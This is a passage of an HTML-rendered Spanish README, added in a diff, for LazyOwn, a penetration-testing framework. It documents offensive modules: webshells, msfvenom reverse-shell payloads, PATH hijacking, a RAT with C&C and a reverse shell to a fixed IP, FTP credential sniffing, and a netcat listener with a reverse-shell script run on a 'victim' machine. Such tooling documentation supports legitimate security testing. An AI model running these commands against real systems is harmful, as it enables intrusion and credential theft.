+<span id="cb14-80"><a href="#cb14-80" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(<span class="ss">f&quot;</span><span class="sc">{</span>i<span class="op">+</span><span class="dv">1</span><span class="sc">}</span><span class="ss">. No hacer nada y salir&quot;</span>)</span>
+<span id="cb14-81"><a href="#cb14-81" aria-hidden="true" tabindex="-1"></a>        </span>
+<span id="cb14-82"><a href="#cb14-82" aria-hidden="true" tabindex="-1"></a>        <span class="cf">while</span> <span class="va">True</span>:</span>
+<span id="cb14-83"><a href="#cb14-83" aria-hidden="true" tabindex="-1"></a>            opcion <span class="op">=</span> <span class="bu">input</span>(<span class="st">&quot;Seleccione una opción: &quot;</span>)</span>
+<span id="cb14-84"><a href="#cb14-84" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> opcion.isdigit() <span class="kw">and</span> <span class="dv">1</span> <span class="op">&lt;=</span> <span class="bu">int</span>(opcion) <span class="op">&lt;=</span> <span class="bu">len</span>(detalles) <span class="op">+</span> <span class="dv">1</span>:</span>
+<span id="cb14-85"><a href="#cb14-85" aria-hidden="true" tabindex="-1"></a>                <span class="cf">break</span></span>
+<span id="cb14-86"><a href="#cb14-86" aria-hidden="true" tabindex="-1"></a>            <span class="cf">else</span>:</span>
+<span id="cb14-87"><a href="#cb14-87" aria-hidden="true" tabindex="-1"></a>                <span class="bu">print</span>(<span class="st">&quot;Opción no válida. Por favor, intente de nuevo.&quot;</span>)</span>
+<span id="cb14-88"><a href="#cb14-88" aria-hidden="true" tabindex="-1"></a>        </span>
+<span id="cb14-89"><a href="#cb14-89" aria-hidden="true" tabindex="-1"></a>        opcion <span class="op">=</span> <span class="bu">int</span>(opcion)</span>
+<span id="cb14-90"><a href="#cb14-90" aria-hidden="true" tabindex="-1"></a>        </span>
+<span id="cb14-91"><a href="#cb14-91" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> opcion <span class="op">&lt;=</span> <span class="bu">len</span>(detalles):</span>
+<span id="cb14-92"><a href="#cb14-92" aria-hidden="true" tabindex="-1"></a>            <span class="bu">print</span>(<span class="ss">f&quot;Ejecutando opción </span><span class="sc">{</span>opcion<span class="sc">}</span><span class="ss"> para </span><span class="sc">{</span>binario<span class="sc">}</span><span class="ss">&quot;</span>)</span>
+<span id="cb14-93"><a href="#cb14-93" aria-hidden="true" tabindex="-1"></a>            <span class="co"># Código para ejecutar la opción correspondiente</span></span>
+<span id="cb14-94"><a href="#cb14-94" aria-hidden="true" tabindex="-1"></a>            <span class="bu">print</span>(<span class="ss">f&quot;Ejemplo de ejecución:</span><span class="ch">\n</span><span class="sc">{</span>detalles<span class="sc">.</span>iloc[opcion<span class="op">-</span><span class="dv">1</span>][<span class="st">&#39;Example&#39;</span>]<span class="sc">}</span><span class="ss">&quot;</span>)</span>
+<span id="cb14-95"><a href="#cb14-95" aria-hidden="true" tabindex="-1"></a>            <span class="co"># Aquí puedes agregar el código para ejecutar el ejemplo si es necesario</span></span>
+<span id="cb14-96"><a href="#cb14-96" aria-hidden="true" tabindex="-1"></a>        <span class="cf">else</span>:</span>
+<span id="cb14-97"><a href="#cb14-97" aria-hidden="true" tabindex="-1"></a>            <span class="bu">print</span>(<span class="st">&quot;Saliendo&quot;</span>)</span>
+<span id="cb14-98"><a href="#cb14-98" aria-hidden="true" tabindex="-1"></a>            <span class="cf">break</span></span>
+<span id="cb14-99"><a href="#cb14-99" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-100"><a href="#cb14-100" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">&#39;__main__&#39;</span>:</span>
+<span id="cb14-101"><a href="#cb14-101" aria-hidden="true" tabindex="-1"></a>    buscar_binarios()</span>
+<span id="cb14-102"><a href="#cb14-102" aria-hidden="true" tabindex="-1"></a>    ejecutar_opciones()</span></code></pre></div>
+<h2 id="uso-modo-lazyown-webshells">Uso modo LazyOwn WebShells</h2>
+<p>LazyOwn Webshell Collection es una colleccion de webshells para
+nuestro framework, el cual nos permite mediante distintos lenguajes
+establecer una webshell en la maquina donde ejecutemos lazyown webshell
+basicamente lo que hace es levantar un servidor web dentro del
+directorio modules para que así esté visible mediante el navegador así
+podemos tanto disponivilizar los modulos por separados mediante web como
+tambien podemos acceder al directorio cgi-bin en donde hay 4 shells una
+bash otra en perl otra en python y en asp por si fuera un windwos</p>
+<div class="sourceCode" id="cb15"><pre
+class="sourceCode sh"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="ex">lazywebshell</span></span></code></pre></div>
+<p>y listo ya podemos acceder a cualquiera de estas url:</p>
+<p><a href="http://localhost:8080/cgi-bin/lazywebshell.sh"
+class="uri">http://localhost:8080/cgi-bin/lazywebshell.sh</a></p>
+<p><a href="http://localhost:8080/cgi-bin/lazywebshell.py"
+class="uri">http://localhost:8080/cgi-bin/lazywebshell.py</a></p>
+<p><a href="http://localhost:8080/cgi-bin/lazywebshell.asp"
+class="uri">http://localhost:8080/cgi-bin/lazywebshell.asp</a></p>
+<p><a href="http://localhost:8080/cgi-bin/lazywebshell.cgi"
+class="uri">http://localhost:8080/cgi-bin/lazywebshell.cgi</a></p>
+<figure>
+<img
+src="https://github.com/grisuno/LazyOwn/assets/1097185/fc0ea814-7044-4f8f-8979-02f9579e9df9"
+alt="image" />
+<figcaption aria-hidden="true">image</figcaption>
+</figure>
+<h2 id="uso-lazy-msfvenom-para-reverse-shell">Uso Lazy MSFVenom para
+Reverse Shell</h2>
+<p>se crearán 3 archivos uno para windows uno para linux y uno para mac
+con el nombre shell.exe, shell.elf, shell.macho respectivamente y se
+invoca con el comando run lazymsfvenom</p>
+<div class="sourceCode" id="cb16"><pre
+class="sourceCode sh"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="ex">run</span> lazymsfvenom</span></code></pre></div>
+<h2 id="uso-lazy-path-hijacking">Uso Lazy PATH Hijacking</h2>
+<p>se crearán un archivo en /tmp con el nombre de binary_name seteado en
+payload inicializado con gzip en memoria y como bash en payload
+parasetear el payload desde el json usar el comando payload para
+ejecutar usar:</p>
+<div class="sourceCode" id="cb17"><pre
+class="sourceCode sh"><code class="sourceCode bash"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="ex">lazypathhijacking</span></span></code></pre></div>
+<h2 id="uso-modo-lazyown-rat">Uso modo LazyOwn RAT</h2>
+<p>LazyOwn RAT es una sencilla pero potente Remote Admin Tool Cuenta con
+una funcion de Screenshot, el cual captura la pantalla del servidor,
+tiene un comando upload, el cual nos permite subir archivos a la maquina
+comprometida, y un modo C&amp;C donde podran enviar comandos al
+servidor, cuenta con dos modos en modo cliente y modo servidor, no tiene
+ningun tipo de ofuscación y la rat me base en BasicRat acá su github <a
+href="https://github.com/awesome-security/basicRAT"
+class="uri">https://github.com/awesome-security/basicRAT</a> y en <a
+href="https://github.com/hash3liZer/SillyRAT"
+class="uri">https://github.com/hash3liZer/SillyRAT</a> aun que está
+ultima es mucho más completa yo solo queria sacar pantallasos subir
+archivos y enviar comandos, quizas más adelante agregar funcionalidad de
+mirar webcams, pero eso más adelante.</p>
+<div class="sourceCode" id="cb18"><pre
+class="sourceCode sh"><code class="sourceCode bash"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="ex">usage:</span> lazyownserver.py <span class="pp">[-</span><span class="ss">h</span><span class="pp">]</span> [--host HOST] [--port PORT] <span class="at">--key</span> KEY</span>
+<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a><span class="ex">lazyownserver.py:</span> error: the following arguments are required: <span class="at">--key</span></span>
+<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-4"><a href="#cb18-4" aria-hidden="true" tabindex="-1"></a><span class="ex">usage:</span> lazyownclient.py <span class="pp">[-</span><span class="ss">h</span><span class="pp">]</span> <span class="at">--host</span> HOST <span class="at">--port</span> PORT <span class="at">--key</span> KEY</span>
+<span id="cb18-5"><a href="#cb18-5" aria-hidden="true" tabindex="-1"></a><span class="ex">lazyownclient.py:</span> error: the following arguments are required: <span class="at">--host,</span> <span class="at">--port,</span> <span class="at">--key</span></span>
+<span id="cb18-6"><a href="#cb18-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-7"><a href="#cb18-7" aria-hidden="true" tabindex="-1"></a><span class="ex">LazyOwn</span><span class="op">&gt;</span> run lazyownclient</span>
+<span id="cb18-8"><a href="#cb18-8" aria-hidden="true" tabindex="-1"></a><span class="ex">[?]</span> lhost and lport and rat_key must be set</span>
+<span id="cb18-9"><a href="#cb18-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-10"><a href="#cb18-10" aria-hidden="true" tabindex="-1"></a><span class="ex">LazyOwn</span><span class="op">&gt;</span> run lazyownserver</span>
+<span id="cb18-11"><a href="#cb18-11" aria-hidden="true" tabindex="-1"></a><span class="ex">[?]</span> rhost and lport and rat_key must be set</span>
+<span id="cb18-12"><a href="#cb18-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-13"><a href="#cb18-13" aria-hidden="true" tabindex="-1"></a><span class="ex">luego</span> los comandos son:</span>
+<span id="cb18-14"><a href="#cb18-14" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-15"><a href="#cb18-15" aria-hidden="true" tabindex="-1"></a><span class="ex">upload</span> /path/to/file</span>
+<span id="cb18-16"><a href="#cb18-16" aria-hidden="true" tabindex="-1"></a><span class="ex">donwload</span> /path/to/file</span>
+<span id="cb18-17"><a href="#cb18-17" aria-hidden="true" tabindex="-1"></a><span class="ex">screenshot</span></span>
+<span id="cb18-18"><a href="#cb18-18" aria-hidden="true" tabindex="-1"></a><span class="ex">sysinfo</span></span>
+<span id="cb18-19"><a href="#cb18-19" aria-hidden="true" tabindex="-1"></a><span class="ex">fix_xauth</span> <span class="co">#to fix xauth xD</span></span>
+<span id="cb18-20"><a href="#cb18-20" aria-hidden="true" tabindex="-1"></a><span class="ex">lazyownreverse</span> 192.168.1.100 8888 <span class="co">#Reverse shell to 192.168.1.100 on port 8888 ready to C&amp;C</span></span></code></pre></div>
+<figure>
+<img
+src="https://github.com/grisuno/LazyOwn/assets/1097185/2bb7ec40-0d89-4ca6-87ff-2baa62781648"
+alt="image" />
+<figcaption aria-hidden="true">image</figcaption>
+</figure>
+<h2 id="uso-modo-lazy-meta-extract0r">Uso modo Lazy Meta Extract0r</h2>
+<p>LazyMeta Extract0r es una herramienta diseñada para extraer metadata
+de varios tipos de archivos, incluidos PDF, DOCX, archivos OLE (como DOC
+y XLS), y varios formatos de imágenes (JPG, JPEG, TIFF). Esta
+herramienta recorrerá un directorio especificado, buscará archivos con
+extensiones compatibles, extraerá la metadata y la guardará en un
+archivo de salida.</p>
+<p>[*] Iniciando: LazyMeta extract0r [;,;]</p>
+<p>usage: lazyown_metaextract0r.py [-h] –path PATH
+lazyown_metaextract0r.py: error: the following arguments are required:
+–path</p>
+<div class="sourceCode" id="cb19"><pre
+class="sourceCode sh"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="ex">python3</span> lazyown_metaextract0r.py <span class="at">--path</span> /home/user</span></code></pre></div>
+<figure>
+<img
+src="https://github.com/grisuno/LazyOwn/assets/1097185/9ec77c01-4bc1-48ab-8c34-7457cff2f79f"
+alt="image" />
+<figcaption aria-hidden="true">image</figcaption>
+</figure>
+<h2 id="uso-modo-decrypt-encrypt">Uso modo decrypt encrypt</h2>
+<p>un metodo de cifrado el cual nos permite tanto encryptar archivos
+como decencriptar los si se cuenta con la llave obviamente:</p>
+<figure>
+<img
+src="https://github.com/grisuno/LazyOwn/assets/1097185/15158dbd-6cd6-4e20-a237-6c89983d42ce"
+alt="Captura de pantalla 2024-06-08 231900" />
+<figcaption aria-hidden="true">Captura de pantalla 2024-06-08
+231900</figcaption>
+</figure>
+<div class="sourceCode" id="cb20"><pre
+class="sourceCode sh"><code class="sourceCode bash"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="ex">encrypt</span> path/to/file key <span class="co"># to encrypt</span></span>
+<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a><span class="ex">decrypt</span> path/to/file.enc key <span class="co">#to decrypt</span></span></code></pre></div>
+<h2 id="uso-modo-lazynmap">Uso modo LazyNmap</h2>
+<p>El uso Lazynmap nos proporciona un script automatizado de un target
+en este caso 127.0.0.1 utilizando nmap el scipr requiere permisos de
+administración mediante sudo. tambien tiene un modulo de net discovery
+para saber que hay en el segmento de ip en el que te encuentras.</p>
+<figure>
+<img
+src="https://github.com/grisuno/LazyOwn/assets/1097185/48a38836-6cf5-4676-bea8-063e0b5cf7ad"
+alt="image" />
+<figcaption aria-hidden="true">image</figcaption>
+</figure>
+<div class="sourceCode" id="cb21"><pre
+class="sourceCode sh"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="ex">./lazynmap.sh</span> <span class="at">-t</span> 127.0.0.1 </span></code></pre></div>
+<h2
+id="uso-modo-chat-generativo-por-consola-lazyown-gpt-one-liner-cli-assistant-y-researcher">Uso
+modo Chat Generativo por Consola LazyOwn GPT One Liner CLI Assistant y
+researcher</h2>
+<p>¡Descubre la revolución en automatización de tareas de pentesting con
+el LazyOwn GPT One Liner CLI Assistant! Este increíble script forma
+parte de la suite de herramientas LazyOwn, diseñadas para hacer tu vida
+como pentester más eficiente y productiva.</p>
+<p>🚀 Principales Características:</p>
+<p>Automatización Inteligente: Utiliza la potencia de Groq y modelos
+avanzados de lenguaje natural para generar comandos precisos y
+eficientes basados en tus necesidades específicas. Interfaz Amigable:
+Con un simple prompt, el asistente genera y ejecuta scripts de una
+línea, reduciendo drásticamente el tiempo y esfuerzo en la creación de
+comandos complejos. Mejora Continua: Transforma y optimiza continuamente
+su base de conocimientos para proporcionarte las mejores soluciones,
+adaptándose a cada situación. Depuración Simplificada: Habilita el modo
+debug para obtener información detallada de cada paso, facilitando la
+identificación y corrección de errores. Integración Perfecta: Funciona
+sin problemas con tu entorno de trabajo, aprovechando el poder de la API
+de Groq para ofrecerte respuestas rápidas y precisas.</p>
+<p>🔒 Seguridad y Control:</p>
+<p>Manejo Seguro de Errores: Detecta y responde inteligentemente a
+errores de ejecución, asegurando que siempre tengas el control total de
+cada comando generado. Ejecución Controlada: Antes de ejecutar cualquier
+comando, solicita tu confirmación, brindándote la tranquilidad de saber
+exactamente qué se está ejecutando en tu sistema.</p>
+<p>🌐 Configuración Sencilla:</p>
+<p>Configura tu API key en segundos y comienza a disfrutar de todas las
+ventajas que ofrece el LazyOwn GPT One Liner CLI Assistant. La guía de
+inicio rápido está disponible para ayudarte a configurar y sacar el
+máximo provecho de esta poderosa herramienta.</p>
+<p>🎯 Ideal para Pentesters y Desarrolladores:</p>
+<p>Optimiza tus Procesos: Simplifica y acelera la generación de comandos
+en tus auditorías de seguridad. Aprendizaje Continuo: La base de
+conocimientos se actualiza y mejora constantemente, proporcionándote
+siempre las mejores prácticas y soluciones más recientes. Con el LazyOwn
+GPT One Liner CLI Assistant, transforma tu forma de trabajar, haciéndola
+más rápida, eficiente y segura. ¡No pierdas más tiempo en tareas
+repetitivas y complejas, y enfócate en lo que realmente importa:
+descubrir y solucionar vulnerabilidades!</p>
+<p>¡Únete a la revolución del pentesting con LazyOwn y lleva tu
+productividad al siguiente nivel!</p>
+<p>[?] Uso: python lazygptcli.py –prompt “<tu prompt>” [–debug]</p>
+<p>[?] Opciones: –prompt “El prompt para la tarea de programación
+(requerido).” –debug, -d “Habilita el modo debug para mostrar mensajes
+de depuración.” –transform “Transforma la base de conocimientos original
+en una base mejorada usando Groq.”</p>
+<p>[?] Asegúrate de configurar tu API key antes de ejecutar el script:
+export GROQ_API_KEY=<tu_api_key> [-&gt;] visit: <a
+href="https://console.groq.com/docs/quickstart"
+class="uri">https://console.groq.com/docs/quickstart</a> not sponsored
+link</p>
+<p>Requisitos: Python 3.x Una API key válida de Groq Pasos para Obtener
+la API Key de Groq: Visita Groq Console (<a
+href="https://console.groq.com/docs/quickstart"
+class="uri">https://console.groq.com/docs/quickstart</a>) para
+registrarte y obtener una API key.</p>
+<div class="sourceCode" id="cb22"><pre
+class="sourceCode sh"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="bu">export</span> <span class="va">GROQ_API_KEY</span><span class="op">=&lt;</span>tu_api_key<span class="op">&gt;</span></span>
+<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="ex">python3</span> lazygptcli.py <span class="at">--prompt</span> <span class="st">&quot;&lt;tu prompt&gt;&quot;</span> <span class="pp">[--</span><span class="ss">debug</span><span class="pp">]</span>          </span></code></pre></div>
+<figure>
+<img
+src="https://github.com/grisuno/LazyOwn/assets/1097185/90a95c2a-48d3-4b02-8055-67656c1e71c9"
+alt="image" />
+<figcaption aria-hidden="true">image</figcaption>
+</figure>
+<h2 id="uso-de-modo-lazyown_bprfuzzer.py">Uso de modo
+lazyown_bprfuzzer.py</h2>
+<p>Proporcionar los argumentos según las solicitudes del script: El
+script solicitará los siguientes argumentos: usage: lazyown_bprfuzzer.py
+[-h] –url URL [–method METHOD] [–headers HEADERS] [–params PARAMS]
+[–data DATA] [–json_data JSON_DATA] [–proxy_port PROXY_PORT] [-w
+WORDLIST] [-hc HIDE_CODE]</p>
+<p>lazyburp.py: error: the following arguments are required: –url –url:
+La URL a la que se enviará la solicitud (obligatorio). –method: El
+método HTTP a utilizar, como GET o POST (opcional, valor predeterminado:
+GET). –headers: Los encabezados de la solicitud en formato JSON
+(opcional, valor predeterminado: {}). –params: Los parámetros de la URL
+en formato JSON (opcional, valor predeterminado: {}). –data: Los datos
+del formulario en formato JSON (opcional, valor predeterminado: {}).
+–json_data: Los datos JSON para la solicitud en formato JSON (opcional,
+valor predeterminado: {}). –proxy_port: El puerto del proxy interno
+(opcional, valor predeterminado: 8080). -w, –wordlist: La ruta del
+diccionario para el modo de fuzzing (opcional). -hc, –hide_code: El
+código de estado HTTP para ocultar en la salida (opcional).</p>
+<div class="sourceCode" id="cb23"><pre
+class="sourceCode sh"><code class="sourceCode bash"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="ex">python3</span> lazyown_bprfuzzer.py <span class="at">--url</span> <span class="st">&quot;http://example.com&quot;</span> <span class="at">--method</span> POST <span class="at">--headers</span> <span class="st">&#39;{&quot;Content-Type&quot;: &quot;LAZYFUZZ&quot;}&#39;</span></span></code></pre></div>
+<p>Forma 2: Uso Avanzado Si deseas aprovechar las características
+avanzadas del script, como el modo de repetición o fuzzing, sigue estos
+pasos:</p>
+<p>Repetición de solicitudes:</p>
+<p>Para utilizar la funcionalidad de repetición de solicitudes,
+proporciona los argumentos como se indicó anteriormente. Durante la
+ejecución, el script preguntará si deseas repetir la solicitud. Ingresa
+‘s’ para repetir o ‘n’ para finalizar el repetidor. Fuzzing:</p>
+<p>Para usar la funcionalidad de fuzzing, asegúrate de proporcionar un
+diccionario de palabras con el argumento -w o –wordlist. El script
+reemplazará la palabra LAZYFUZZ en la URL y otros datos con las palabras
+del diccionario proporcionado. Durante la ejecución, el script mostrará
+los resultados de cada iteración de fuzzing. Estas son las formas
+básicas y avanzadas de usar el script lazyburp.py. Dependiendo de tus
+necesidades, puedes elegir la forma que mejor se adapte a tu situación
+específica.</p>
+<div class="sourceCode" id="cb24"><pre
+class="sourceCode sh"><code class="sourceCode bash"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="ex">python3</span> lazyown_bprfuzzer.py <span class="dt">\ </span>                                                                                                          ─╯</span>
+<span id="cb24-2"><a href="#cb24-2" aria-hidden="true" tabindex="-1"></a>    <span class="ex">--url</span> <span class="st">&quot;http://127.0.0.1:80/LAZYFUZZ&quot;</span> <span class="dt">\</span></span>
+<span id="cb24-3"><a href="#cb24-3" aria-hidden="true" tabindex="-1"></a>    <span class="at">--method</span> POST <span class="dt">\</span></span>
+<span id="cb24-4"><a href="#cb24-4" aria-hidden="true" tabindex="-1"></a>    <span class="at">--headers</span> <span class="st">&#39;{&quot;User-Agent&quot;: &quot;LAZYFUZZ&quot;}&#39;</span> <span class="dt">\</span></span>
+<span id="cb24-5"><a href="#cb24-5" aria-hidden="true" tabindex="-1"></a>    <span class="at">--params</span> <span class="st">&#39;{&quot;param1&quot;: &quot;value1&quot;, &quot;param2&quot;: &quot;LAZYFUZZ&quot;}&#39;</span> <span class="dt">\</span></span>
+<span id="cb24-6"><a href="#cb24-6" aria-hidden="true" tabindex="-1"></a>    <span class="at">--data</span> <span class="st">&#39;{&quot;key1&quot;: &quot;LAZYFUZZ&quot;, &quot;key2&quot;: &quot;value2&quot;}&#39;</span> <span class="dt">\</span></span>
+<span id="cb24-7"><a href="#cb24-7" aria-hidden="true" tabindex="-1"></a>    <span class="at">--json_data</span> <span class="st">&#39;{&quot;key3&quot;: &quot;LAZYFUZZ&quot;}&#39;</span> <span class="dt">\</span></span>
+<span id="cb24-8"><a href="#cb24-8" aria-hidden="true" tabindex="-1"></a>    <span class="at">--proxy_port</span> 8080 <span class="dt">\</span></span>
+<span id="cb24-9"><a href="#cb24-9" aria-hidden="true" tabindex="-1"></a>    <span class="at">-w</span> /usr/share/seclist/SecLists-master/Discovery/Variables/awesome-environment-variable-names.txt <span class="dt">\</span></span>
+<span id="cb24-10"><a href="#cb24-10" aria-hidden="true" tabindex="-1"></a>    <span class="at">-hc</span> 501</span></code></pre></div>
+<div class="sourceCode" id="cb25"><pre
+class="sourceCode sh"><code class="sourceCode bash"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a><span class="ex">python3</span> lazyown_bprfuzzer.py <span class="dt">\ </span>                                                                                                          ─╯</span>
+<span id="cb25-2"><a href="#cb25-2" aria-hidden="true" tabindex="-1"></a>    <span class="ex">--url</span> <span class="st">&quot;http://127.0.0.1:80/LAZYFUZZ&quot;</span> <span class="dt">\</span></span>
+<span id="cb25-3"><a href="#cb25-3" aria-hidden="true" tabindex="-1"></a>    <span class="at">--method</span> POST <span class="dt">\</span></span>
+<span id="cb25-4"><a href="#cb25-4" aria-hidden="true" tabindex="-1"></a>    <span class="at">--headers</span> <span class="st">&#39;{&quot;User-Agent&quot;: &quot;LAZYFUZZ&quot;}&#39;</span> <span class="dt">\</span></span>
+<span id="cb25-5"><a href="#cb25-5" aria-hidden="true" tabindex="-1"></a>    <span class="at">--params</span> <span class="st">&#39;{&quot;param1&quot;: &quot;value1&quot;, &quot;param2&quot;: &quot;LAZYFUZZ&quot;}&#39;</span> <span class="dt">\</span></span>
+<span id="cb25-6"><a href="#cb25-6" aria-hidden="true" tabindex="-1"></a>    <span class="at">--data</span> <span class="st">&#39;{&quot;key1&quot;: &quot;LAZYFUZZ&quot;, &quot;key2&quot;: &quot;value2&quot;}&#39;</span> <span class="dt">\</span></span>
+<span id="cb25-7"><a href="#cb25-7" aria-hidden="true" tabindex="-1"></a>    <span class="at">--json_data</span> <span class="st">&#39;{&quot;key3&quot;: &quot;LAZYFUZZ&quot;}&#39;</span> <span class="dt">\</span></span>
+<span id="cb25-8"><a href="#cb25-8" aria-hidden="true" tabindex="-1"></a>    <span class="at">--proxy_port</span> 8080 <span class="dt">\</span></span>
+<span id="cb25-9"><a href="#cb25-9" aria-hidden="true" tabindex="-1"></a>    <span class="at">-w</span> /usr/share/seclist/SecLists-master/Discovery/Variables/awesome-environment-variable-names.txt <span class="dt">\</span></span>
+<span id="cb25-10"><a href="#cb25-10" aria-hidden="true" tabindex="-1"></a> </span></code></pre></div>
+<p><img
+src="https://github.com/grisuno/LazyOwn/assets/1097185/dc66fdc2-cd7d-4b79-92c6-dd43d376ee0e"
+alt="image" /> PD: para usar el diccionario que utilizo realizar dentro
+de /usr/share/seclist el siguiente comando</p>
+<div class="sourceCode" id="cb26"><pre
+class="sourceCode sh"><code class="sourceCode bash"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="fu">wget</span> <span class="at">-c</span> https://github.com/danielmiessler/SecLists/archive/master.zip <span class="at">-O</span> SecList.zip <span class="dt">\</span></span>
+<span id="cb26-2"><a href="#cb26-2" aria-hidden="true" tabindex="-1"></a><span class="kw">&amp;&amp;</span> <span class="fu">unzip</span> SecList.zip <span class="dt">\</span></span>
+<span id="cb26-3"><a href="#cb26-3" aria-hidden="true" tabindex="-1"></a><span class="kw">&amp;&amp;</span> <span class="fu">rm</span> <span class="at">-f</span> SecList.zip</span></code></pre></div>
+<h2 id="uso-modo-lazyown-ftp-sniff">Uso modo LazyOwn FTP Sniff</h2>
+<p>este modulo sirve para buscar claves en la red de servidores ftp,
+algunos me dirán que no se ya no se usa pero se sorprenderian en los
+entornos productivos en infraestructura critica que e visto maquinas con
+FTP’s masivos corriendo en sus servidores :)</p>
+<div class="sourceCode" id="cb27"><pre
+class="sourceCode sh"><code class="sourceCode bash"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="bu">set</span> device eth0</span>
+<span id="cb27-2"><a href="#cb27-2" aria-hidden="true" tabindex="-1"></a><span class="ex">run</span> lazyftpsniff</span></code></pre></div>
+<figure>
+<img
+src="https://github.com/grisuno/LazyOwn/assets/1097185/d2d1c680-fc03-4f60-adc4-20248f3e3859"
+alt="image" />
+<figcaption aria-hidden="true">image</figcaption>
+</figure>
+<h2 id="uso-modo-lazyreverseshell">Uso modo LazyReverseShell</h2>
+<p>primero nos ponemos en escucha con el comando</p>
+<div class="sourceCode" id="cb28"><pre
+class="sourceCode sh"><code class="sourceCode bash"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-nlvp</span> 1337 <span class="co">#o el puerto que escojamos </span></span></code></pre></div>
+<figure>
+<img
+src="https://github.com/grisuno/LazyOwn/assets/1097185/dfb7a81d-ac7f-4b8b-8f1f-717e058260b5"
+alt="image" />
+<figcaption aria-hidden="true">image</figcaption>
+</figure>
+<p>para luego en la maquina victima</p>
+<div class="sourceCode" id="cb29"><pre
+class="sourceCode sh"><code class="sourceCode bash"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a><span class="ex">./lazyreverse_shell.sh</span> <span class="at">--ip</span> 127.0.0.1 <span class="at">--puerto</span> 1337</span></code></pre></div>
+<figure>
+<img
+src="https://github.com/grisuno/LazyOwn/assets/1097185/b489be5d-0b53-4054-995f-6106c9c95190"
+alt="image" />
+<figcaption aria-hidden="true">image</figcaption>
+</figure>
+<h2 id="uso-modo-lazy-curl-to-recon">Uso modo Lazy Curl to recon</h2>
+<p>el modulo está en modules y se usa así:</p>
+<div class="sourceCode" id="cb30"><pre
+class="sourceCode sh"><code class="sourceCode bash"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> +x lazycurl.sh</span></code></pre></div>
+<p>Ejecutar el script con los parámetros deseados. Por ejemplo:</p>
+<div class="sourceCode" id="cb31"><pre
+class="sourceCode sh"><code class="sourceCode bash"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a><span class="ex">./lazycurl.sh</span> <span class="at">--mode</span> GET <span class="at">--url</span> http://10.10.10.10</span></code></pre></div>
+<p>Ejemplos de uso</p>
+<p>Enviar una solicitud GET:</p>
+<div class="sourceCode" id="cb32"><pre
+class="sourceCode sh"><code class="sourceCode bash"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true" tabindex="-1"></a><span class="ex">./lazycurl.sh</span> <span class="at">--mode</span> GET <span class="at">--url</span> http://10.10.10.10</span></code></pre></div>
+<p>Enviar una solicitud POST:</p>
+<div class="sourceCode" id="cb33"><pre
+class="sourceCode sh"><code class="sourceCode bash"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a><span class="ex">./lazycurl.sh</span> <span class="at">--mode</span> POST <span class="at">--url</span> http://10.10.10.10 <span class="at">--data</span> <span class="st">&quot;param1=value1&amp;param2=value2&quot;</span></span></code></pre></div>
+<p>Probar un método TRACE:</p>
+<div class="sourceCode" id="cb34"><pre
+class="sourceCode sh"><code class="sourceCode bash"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true" tabindex="-1"></a><span class="ex">./lazycurl.sh</span> <span class="at">--mode</span> TRACE <span class="at">--url</span> http://10.10.10.10</span>
+<span id="cb34-2"><a href="#cb34-2" aria-hidden="true" tabindex="-1"></a><span class="kw">```</span><span class="fu">sh</span></span>
+<span id="cb34-3"><a href="#cb34-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb34-4"><a href="#cb34-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Subir</span> un archivo:</span>
+<span id="cb34-5"><a href="#cb34-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb34-6"><a href="#cb34-6" aria-hidden="true" tabindex="-1"></a><span class="kw">```</span>sh</span>
+<span id="cb34-7"><a href="#cb34-7" aria-hidden="true" tabindex="-1"></a><span class="ex">./lazycurl.sh</span> <span class="at">--mode</span> UPLOAD <span class="at">--url</span> http://10.10.10.10 <span class="at">--file</span> file.txt</span></code></pre></div>
+<p>Realizar fuerza bruta con una wordlist:</p>
+<div class="sourceCode" id="cb35"><pre
